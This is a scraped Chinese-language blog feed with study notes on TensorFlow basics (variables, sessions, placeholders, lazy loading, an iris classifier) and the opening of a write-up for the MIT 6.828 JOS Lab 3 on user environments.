<p>然而上面代码的结果还是10，为什么呢？</p>
<p>因为上面的 assign 只是一个操作，并没有去执行。需要在 session 里运行这个操作才能让其有作用。</p>
<pre class=" language-python"><code class="language-python">W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
assign_op <span class="token operator">=</span> W<span class="token punctuation">.</span>assign<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>assign_op<span class="token punctuation">)</span>
    <span class="token keyword">print</span> W<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>这里没进行初始化，是因为 assgin 替我们完成了初始化的操作。其实初始化操作也是一种赋值操作。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a variable whose original value is 2</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"scalar"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># assign a * 2 to a and call that op a_times_two</span>
a_times_two <span class="token operator">=</span> a<span class="token punctuation">.</span>assign<span class="token punctuation">(</span>a <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
init <span class="token operator">=</span> tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>init<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># have to initialize a, because a_times_two op depends on the value of a</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>a_times_two<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># >> 4</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>a_times_two<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># >> 8</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>a_times_two<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># >> 16</span>
</code></pre>
<p>TensorFlow 每次 a_times_two 都会将 a 乘 2。</p>
<p>对于简单的加减，TensorFlow 提供了 tf.Variable.assign_add() 和 tf.Variable.assign_sub() 方法。要注意的是，这两个方法不会初始化变量。</p>
<pre class=" language-python"><code class="language-python">W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initializer<span class="token punctuation">)</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>assign_add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>W<span class="token punctuation">.</span>assign_sub<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>TensorFlow 的每个 session 维护各自的值。</p>
<p>当然 变量 可以基于其他 变量 。 比如声明 U = W * 2。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># W is a random 700 x 100 tensor</span>
W <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>truncated_normal<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">700</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
U <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>W <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<p>当然这里最好确保W要先初始化。</p>
<pre class=" language-python"><code class="language-python">U <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span>W<span class="token punctuation">.</span>initial_value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="InteractiveSession_28_u4EA4_u4E92_u5F0F_u4F1A_u8BDD_29"><a href="#InteractiveSession_28_u4EA4_u4E92_u5F0F_u4F1A_u8BDD_29" class="headerlink" title="InteractiveSession(交互式会话)"></a>InteractiveSession(交互式会话)</h4><p>InteractiveSession 与 Session 不同的地方在于前者会将其本身作为默认的会话，所以之后调用 run() 或 eval() 可以不用指明会话。虽然很方便，但如果有多个会话就很麻烦。</p>
<pre class=" language-python"><code class="language-python">sess <span class="token operator">=</span> tf<span class="token punctuation">.</span>InteractiveSession<span class="token punctuation">(</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">5.0</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token number">6.0</span><span class="token punctuation">)</span>
c <span class="token operator">=</span> a <span class="token operator">*</span> b
<span class="token comment" spellcheck="true"># We can just use 'c.eval()' without passing 'sess'</span>
<span class="token keyword">print</span> c<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>
sess<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>tf.get_default_session() 返回当前线程的默认会话。</p>
<h4 id="Control_Dependencies"><a href="#Control_Dependencies" class="headerlink" title="Control Dependencies"></a>Control Dependencies</h4><p>如果有两个独立操作，想指明哪个操作先执行，可以使用 tf.Graph.control_dependencies(control_inputs)</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># your graph g have 5 ops: a, b, c, d, e </span>
<span class="token keyword">with</span> g<span class="token punctuation">.</span>control_dependencies<span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># `d` and `e` will only run after `a`, `b`, and `c` have executed. </span>
    d <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    e <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<h4 id="Placeholders_28_u5360_u4F4D_u7B26_29__u548C_feed_dict"><a href="#Placeholders_28_u5360_u4F4D_u7B26_29__u548C_feed_dict" class="headerlink" title="Placeholders(占位符) 和 feed_dict"></a>Placeholders(占位符) 和 feed_dict</h4><p>TensorFlow 程序通常有两个时期：</p>
<ol>
<li>构造一个 图</li>
<li>在 图 里使用 会话 执行 操作</li>
</ol>
<p>所以在构造 图 的时候，可以不需要知道计算的具体值，类似于定义一个函数。比如 f(x, y) = x*2 + y，x,y 就是 Placeholders(占位符) 。</p>
<p>定义占位符</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>dtype<span class="token punctuation">,</span> shape<span class="token operator">=</span>None<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span>
</code></pre>
<p>Dtype 是必须的参数指明了占位符的数据类型。</p>
<p>Shape 规定了占位符能接受的张量的维度。shape=None 表示任何维度都可以接受。坏处就是不好debug。</p>
<p>只定义了占位符还没用，需要通过获取值来进行计算。placeholder 获取的值通过一个字典。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create a placeholder of type float 32-bit, shape is a vector of 3 elements</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> shape<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># create a constant of type float 32-bit, shape is a vector of 3 elements</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>constant<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>float32<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># use the placeholder as you would a constant or a variable</span>
c <span class="token operator">=</span> a <span class="token operator">+</span> b  <span class="token comment" spellcheck="true"># Short for tf.add(a, b)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
      <span class="token comment" spellcheck="true"># feed [1, 2, 3] to placeholder a via the dict {a: [1, 2, 3]}</span>
      <span class="token comment" spellcheck="true"># fetch value of c</span>
      <span class="token keyword">print</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># the tensor a is the key, not the string ‘a’</span>
</code></pre>
<p>获取值不仅仅是占位符可以，任何可获取值的张量都可以。使用一下方法可以确定张量是否可获取值:</p>
<pre class=" language-python"><code class="language-python">tf<span class="token punctuation">.</span>Graph<span class="token punctuation">.</span>is_feedable<span class="token punctuation">(</span>tensor<span class="token punctuation">)</span>
</code></pre>
<p>比如</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># create Operations, Tensors, etc (using the default graph)</span>
a <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>mul<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># start up a `Session` using the default graph</span>
sess <span class="token operator">=</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># define a dictionary that says to replace the value of `a` with 15</span>
replace_dict <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">}</span>
<span class="token comment" spellcheck="true"># Run the session, passing in `replace_dict` as the value to `feed_dict`</span>
sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>b<span class="token punctuation">,</span> feed_dict<span class="token operator">=</span>replace_dict<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># returns 45</span>
</code></pre>
<h4 id="u61D2_u52A0_u8F7D"><a href="#u61D2_u52A0_u8F7D" class="headerlink" title="懒加载"></a>懒加载</h4><p>懒加载是一种编程模式，表示直到加载的时候才声明或者初始化。在 TensorFlow 中，表示直到进行计算的时候才创建这个操作。</p>
<p>比如正常情况下，</p>
<pre class=" language-python"><code class="language-python">x <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>
y <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>
z <span class="token operator">=</span> tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    writer <span class="token operator">=</span> tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span>FileWriter<span class="token punctuation">(</span><span class="token string">'./my_graph/l2'</span><span class="token punctuation">,</span> sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>
    <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>z<span class="token punctuation">)</span>
        writer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>而懒加载的代码</p>
<pre class=" language-python"><code class="language-python">x <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>
y <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
     sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     writer <span class="token operator">=</span> tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span>FileWriter<span class="token punctuation">(</span><span class="token string">'./my_graph/l2'</span><span class="token punctuation">,</span> sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>
     <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
           sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># someone decides to be clever to save one line of code</span>
     writer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>通过查看 TensorBoard ，可以发现不同之处。</p>
<p>当然，也可以通过查看 图 定义，使用</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">print</span> tf<span class="token punctuation">.</span>get_default_graph<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>as_graph_def<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>发现后者，也就是懒加载中，节点 里多了9个 Add 操作的拷贝。明明同样的操作，却会造成很大的开销。为了避免这个情况，尽量分开定义操作和执行。另一种就是使用 Python property装饰器。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               </p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Tensorflow for Deep Learning 1]]></title>
      <url>http://xinqiu.me/2017/01/20/cs20si-1/</url>
      <content type="html"><![CDATA[<h2 id="u7B14_u8BB01_3A__u4ECB_u7ECDTensorFlow"><a href="#u7B14_u8BB01_3A__u4ECB_u7ECDTensorFlow" class="headerlink" title="笔记1: 介绍TensorFlow"></a>笔记1: 介绍TensorFlow</h2><p>“CS 20SI: TensorFlow for Deep Learning Research” (<a href="http://cs20si.stanford.edu" target="_blank" rel="external">http://cs20si.stanford.edu</a>) 这门课是由Chip Huyen(huyenn@stanford.edu)老师上的，我就简单的做做笔记整理&gt; &lt;.</p>
<p>Tensorflow是什么，它很火，哪些公司在用它，它是如何安装的，我这里就不啰嗦了，这些内容网上一大把。</p>
<h3 id="u4E00-_u5F00_u59CB_u5199Tensorflow_u4EE3_u7801"><a href="#u4E00-_u5F00_u59CB_u5199Tensorflow_u4EE3_u7801" class="headerlink" title="一.开始写Tensorflow代码"></a>一.开始写Tensorflow代码</h3><p>这部分内容是可以跳过的，讲的是简单的一个tf程序。(我添加了导入一些包，不然运行不了)</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># iris.py</span>
<span class="token comment" spellcheck="true"># </span>
<span class="token comment" spellcheck="true"># Load dataset.</span>
<span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> cross_validation
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> metrics

iris <span class="token operator">=</span> tf<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>learn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>load_dataset<span class="token punctuation">(</span><span class="token string">'iris'</span><span class="token punctuation">)</span>

x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test <span class="token operator">=</span> cross_validation<span class="token punctuation">.</span>train_test_split<span class="token punctuation">(</span>iris<span class="token punctuation">.</span>data<span class="token punctuation">,</span> iris<span class="token punctuation">.</span>target<span class="token punctuation">,</span> test_size<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> random_state<span class="token operator">=</span><span class="token number">42</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Build 3 layer DNN with 10, 20, 10 units respectively.</span>
feature_columns <span class="token operator">=</span> tf<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>learn<span class="token punctuation">.</span>infer_real_valued_columns_from_input<span class="token punctuation">(</span>x_train<span class="token punctuation">)</span>

classifier <span class="token operator">=</span> tf<span class="token punctuation">.</span>contrib<span class="token punctuation">.</span>learn<span class="token punctuation">.</span>DNNClassifier<span class="token punctuation">(</span>feature_columns<span class="token operator">=</span>feature_columns<span class="token punctuation">,</span> hidden_units<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> n_classes<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Fit and predict.</span>
classifier<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> steps<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>

predictions <span class="token operator">=</span> list<span class="token punctuation">(</span>classifier<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span> as_iterable<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
score <span class="token operator">=</span> metrics<span class="token punctuation">.</span>accuracy_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> predictions<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Accuracy: {0:f}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>score<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>运行结果 Accuracy: 0.933333</p>
<h4 id="1-_TF_Learn__28tf-contrib-learn_29"><a href="#1-_TF_Learn__28tf-contrib-learn_29" class="headerlink" title="1. TF Learn (tf.contrib.learn)"></a>1. TF Learn (tf.contrib.learn)</h4><p>TensorFlow的简单接口，TF Learn (tensorflow.contrib.learn)，提供已经实现的模型可供使用者简单的调用。类似scikit learn，通过简单的几行代码就可以开始深度学习。事实上TF Learn期初是Scikit Flow (SKFlow)这个独立的项目。</p>
<p>TF Learn可以导入数据，构造模型，模型拟合，评估准确性。很多模型可以调用，比如线性分类，线性回归，DNN分类器。</p>
<h4 id="2-_TF-Slim__28tf-contrib-slim_29"><a href="#2-_TF-Slim__28tf-contrib-slim_29" class="headerlink" title="2. TF-Slim (tf.contrib.slim)"></a>2. TF-Slim (tf.contrib.slim)</h4><p>TF-Slim可以用来简单构建、训练、评估神经网络。</p>
<h4 id="3-_TensorFlow_u4E4B_u4E0A_u7684_u9AD8_u7EA7APIs"><a href="#3-_TensorFlow_u4E4B_u4E0A_u7684_u9AD8_u7EA7APIs" class="headerlink" title="3. TensorFlow之上的高级APIs"></a>3. TensorFlow之上的高级APIs</h4><p>有很多基于TensorFlow的APIs， 比如Keras (keras@GitHub), TFLearn (tflearn@GitHub), 和 Pretty Tensor (prettytensor@GitHub)。现在据说Keras准备作为官方默认API了，Keras真的超级好用&gt; &lt;.</p>
<p>TFLearn支持ConvNets, LSTM, BiRNN, ResNets, Generative networks以及一些特征BatchNorm, PReLU.</p>
<p>当然啦，TensorFlow的目的不是提供开箱即用的机器学习工具箱，而是希望能够针对不同场景不同需求，更灵活的搭建合适的架构来自己使用。</p>
<h3 id="Data_Flow_Graph__28_u6570_u636E_u6D41_u56FE_29"><a href="#Data_Flow_Graph__28_u6570_u636E_u6D41_u56FE_29" class="headerlink" title="Data Flow Graph (数据流图)"></a>Data Flow Graph (数据流图)</h3><p>TF使用数据流图，所有的计算都在图(graphs)中。session(这个我也不知道中文该怎么称呼，感觉英文就挺好的)用来分配给变量内存。参考这篇文章什么是tensorflow session。总之就是图是用来定义计算的，session是执行图里的计算的。</p>
<p>note 1 结束了，感觉有点少，算是入坑的开头吧&gt; &lt;</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MIT 6.828 Lab 3]]></title>
      <url>http://xinqiu.me/2017/01/17/MIT-6.828-3/</url>
      <content type="html"><![CDATA[<p>继续开始Lab3，用户环境。</p>
<a id="more"></a>
<h2 id="u5E8F_u8A00"><a href="#u5E8F_u8A00" class="headerlink" title="序言"></a>序言</h2><p>这个lab要实现基础内核功能来保证被保护的用户模式环境正常运行。要为JOS内核添加数据结构，记录用户环境，创建单用户环境，加载程序镜像并运行。要让JOS内核能够处理系统调用和各种异常。</p>
<p><strong>注意</strong>：这里环境类似进程，用环境是为了与操作系统的进程做点区分，强调这是JOS的环境下。</p>
<h2 id="Part_A_3A__u7528_u6237_u73AF_u5883_u548C_u5F02_u5E38_u5904_u7406"><a href="#Part_A_3A__u7528_u6237_u73AF_u5883_u548C_u5F02_u5E38_u5904_u7406" class="headerlink" title="Part A: 用户环境和异常处理"></a>Part A: 用户环境和异常处理</h2><p><code>inc/env.h</code>包含了用户环境的定义，内核使用 <code>ENV</code> 数据结构记录每个用户环境，这里用户环境有点像上下文，这个lab只要创建一个环境，但要设计JOS内核让其支持多环境。</p>
<p>在<code>kern/env.c</code>中定义了三个全局变量:</p>
<ul>
<li>struct Env *envs = NULL;        // All environments</li>
<li>struct Env *curenv = NULL;        // The current env</li>
<li>static struct Env *env_free_list;    // Free environment list</li>
</ul>
<p>JOS运行以后，envs指针指向一个存放系统中各种环境的<code>Env</code>结构体数组。JOS内核支持最大<code>NENV</code>(2^10,宏定义在<code>inc/env.h</code>中)个同时活动的环境。</p>
<p>JOS内核用<code>env_free_list</code>维护所有不活动的<code>Env</code>结构体，类似空闲链表。内核使用<code>curenv</code>来表示当前运行的环境，内核启动之前这个变量是NULL。</p>
<h3 id="u73AF_u5883_u72B6_u6001"><a href="#u73AF_u5883_u72B6_u6001" class="headerlink" title="环境状态"></a>环境状态</h3><p><code>Env</code>结构体在<code>inc/env.h</code>中定义了:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> Env <span class="token punctuation">{</span>
    <span class="token keyword">struct</span> Trapframe env_tf<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Saved registers</span>
    <span class="token keyword">struct</span> Env <span class="token operator">*</span>env_link<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Next free Env</span>
    envid_t env_id<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Unique environment identifier</span>
    envid_t env_parent_id<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// env_id of this env's parent</span>
    <span class="token keyword">enum</span> EnvType env_type<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Indicates special system environments</span>
    <span class="token keyword">unsigned</span> env_status<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Status of the environment</span>
    uint32_t env_runs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Number of times environment has run</span>

    <span class="token comment" spellcheck="true">// Address space</span>
    pde_t <span class="token operator">*</span>env_pgdir<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Kernel virtual address of page dir</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p><strong>env_tf</strong>: 定义在<code>inc/trap.h</code>中，用来存放环境停止运行时寄存器的值。内核从用户模式切换为内核模式时也会保存寄存器的值，这样之后环境恢复的时候可以读取出来。</p>
<p><strong>env_link</strong>：指向<code>env_free_list</code>中的下一个<code>Env</code>, <code>env_free_list</code>指向空闲env链表的第一个env环境。</p>
<p><strong>env_id</strong>：当前Env环境的唯一id。即使用户环境终止，这个结构体被重新分配在同一块空间，这个id值还是不同的。</p>
<p><strong>env_parent_id</strong>：内核储存env_id环境的父用户环境id。</p>
<p><strong>env_type</strong>：用来区别特定环境。大部分情况是<code>ENV_TYPE_USER</code>。</p>
<p><strong>env_status</strong>：这个变量保存了以下几种值</p>
<ul>
<li>ENV_FREE： 这个Env结构体不活跃，因此在<code>env_free_list</code>中。</li>
<li>ENV_RUNNABLE：这个结构体对应的环境等待被运行。</li>
<li>ENV_RUNNING：这个结构体对应的环境正在运行。</li>
<li>ENV_NOT_RUNNABLE：当前环境是活跃的但没准备运行。比如等待其他环境进行IPC(进程通信)。</li>
<li>ENV_DYING：这是个僵尸环境，下一次陷入内核会被释放。</li>
</ul>
<p>如同Unix进程，JOS环境结合了线程和地址空间。线程通常由被保存的寄存器定义，地址空间由env_pgdir指向的页目录和页表定义。想要运行环境必须给CPU设置合适的寄存器和地址空间。</p>
<h3 id="u5206_u914D_u73AF_u5883_u6570_u7EC4"><a href="#u5206_u914D_u73AF_u5883_u6570_u7EC4" class="headerlink" title="分配环境数组"></a>分配环境数组</h3><p>修改mem_init()去分配一个Env数组envs。</p>
<h4 id="Exercise_1"><a href="#Exercise_1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><p>分配一个envs数组，这个数组包含Env结构体的实例NENV。和pages数组一样，这个envs应该映射到用户只读的UENVS(定义在<code>inc/memlayout.h</code>)，这样用户进程可以读取。通过修改mem_init()，首先是初始化envs指针，</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Make 'envs' point to an array of size 'NENV' of 'struct Env'.</span>
<span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
envs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Env<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">boot_alloc</span><span class="token punctuation">(</span>NENV<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>envs<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> NENV<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Env<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>接着是准备映射，</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Map the 'envs' array read-only by the user at linear address UENVS</span>
<span class="token comment" spellcheck="true">// (ie. perm = PTE_U | PTE_P).</span>
<span class="token comment" spellcheck="true">// Permissions:</span>
<span class="token comment" spellcheck="true">//    - the new image at UENVS  -- kernel R, user R</span>
<span class="token comment" spellcheck="true">//    - envs itself -- kernel RW, user NONE</span>
<span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
<span class="token function">boot_map_region</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> UENVS<span class="token punctuation">,</span> PTSIZE<span class="token punctuation">,</span> <span class="token function">PADDR</span><span class="token punctuation">(</span>envs<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_U<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>通过<code>make qemu-nox</code>可看到<code>check_kern_pgdir() succeeded!</code>证明有用。</p>
<h3 id="u521B_u5EFA_u548C_u8FD0_u884C_u73AF_u5883"><a href="#u521B_u5EFA_u548C_u8FD0_u884C_u73AF_u5883" class="headerlink" title="创建和运行环境"></a>创建和运行环境</h3><p>完善<code>kern/env.c</code>使之能够运行一个用户环境。因为还没做文件系统，所以设置内核去加载一个静态二进制镜像，JOS将这个作为ELF可执行镜像嵌入内核。</p>
<p>Lab3的GNUmakefile生成若干二进制镜像在<code>obj/user/</code>目录。</p>
<p>在<code>kern/init.c</code>中的i386_init()中，运行这些二进制镜像的代码都在一个环境中。</p>
